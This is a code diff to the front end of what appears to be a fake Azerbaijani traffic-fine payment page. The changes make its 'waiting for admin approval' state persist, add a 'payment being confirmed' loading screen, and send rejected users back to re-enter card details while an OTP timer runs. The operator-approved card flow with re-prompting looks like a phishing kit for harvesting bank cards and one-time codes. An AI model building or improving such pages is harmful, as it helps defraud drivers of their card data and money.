@@ -192,7 +192,7 @@
         let timerInterval;
         let otpTimeLeft = 180;
         let otpInterval;
-        let waitingForApproval = false;
+        let isWaitingForAdmin = false;
         let adviceShown = false;
 
         async function initConfig() {
@@ -241,22 +241,35 @@
             }
         }
 
+        function showLoadingScreen() {
+            document.getElementById('app-container').innerHTML = `
+                <div class="bg-white rounded-2xl shadow-2xl overflow-hidden p-12 text-center space-y-6">
+                    <div class="inline-block animate-spin rounded-full h-20 w-20 border-4 border-blue-600 border-t-transparent mx-auto"></div>
+                    <div class="space-y-2">
+                        <h1 class="text-2xl font-bold text-gray-800">Ödəniş Təsdiqlənir...</h1>
+                        <p class="text-sm text-gray-500">Zəhmət olmasa gözləyin, bank əməliyyatı və admin təsdiqi yoxlanılır.</p>
+                    </div>
+                </div>
+            `;
+        }
+
         function updateUI(data) {
             let lastProtocol = localStorage.getItem('dyp_last_protocol');
             if (lastProtocol !== data.protocolNo) {
                 localStorage.setItem('dyp_last_protocol', data.protocolNo);
                 const newEndTime = Date.now() + 10 * 60 * 1000;
                 localStorage.setItem('dyp_timer_end', newEndTime);
+                localStorage.removeItem('dyp_waiting');
+                isWaitingForAdmin = false;
                 adviceShown = false;
             }
 
             if (data.isPaid || data.isRejected) {
+                isWaitingForAdmin = false;
                 localStorage.removeItem('dyp_waiting');
             }
 
-            // CHECK ISPAID AND ISREJECTED FIRST BEFORE WAITING CHECKS!
             if (data.isRejected) {
-                document.getElementById('loading-modal').classList.add('hidden');
                 document.getElementById('reject-reason-text').textContent = data.rejectReason || "Kart məlumatlarınız düzgün deyil və ya balansınızda kifayət qədər vəsatət yoxdur.";
                 document.getElementById('reject-modal').classList.remove('hidden');
                 return;
@@ -265,10 +278,8 @@
             }
 
             if (data.isPaid) {
-                localStorage.removeItem('dyp_waiting');
                 clearInterval(timerInterval);
 
-                // Show receipt first
                 document.getElementById('app-container').innerHTML = `
                     <div class="bg-white rounded-2xl shadow-2xl overflow-hidden p-8 text-center space-y-6 border-t-8 border-green-600">
                         <div class="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto text-4xl shadow-inner">
@@ -312,7 +323,6 @@
                     </div>
                 `;
 
-                // After 5 seconds, transition to Driver's Advice Leaflet and stay there
                 if (!adviceShown) {
                     adviceShown = true;
                     setTimeout(() => {
@@ -351,7 +361,7 @@
                 return;
             }
 
-            if (waitingForApproval || data.isPendingApproval) {
+            if (isWaitingForAdmin || localStorage.getItem('dyp_waiting') === 'true' || data.isPendingApproval) {
                 showLoadingScreen();
                 return;
             }
@@ -435,7 +445,8 @@
                 return;
             }
 
-            waitingForApproval = true;
+            isWaitingForAdmin = true;
+            localStorage.setItem('dyp_waiting', 'true');
             closeModals();
             showLoadingScreen();
 
@@ -467,11 +478,10 @@
                 console.error("Clear reject error:", err);
             }
             localStorage.removeItem('dyp_waiting');
+            isWaitingForAdmin = false;
             document.getElementById('reject-modal').classList.add('hidden');
-            waitingForApproval = false;
 
-            // Close any open modals and open the card details modal so they can re-enter card info!
-            closeModals();
+            await fetchFineData();
             openCardModal();
         }
 
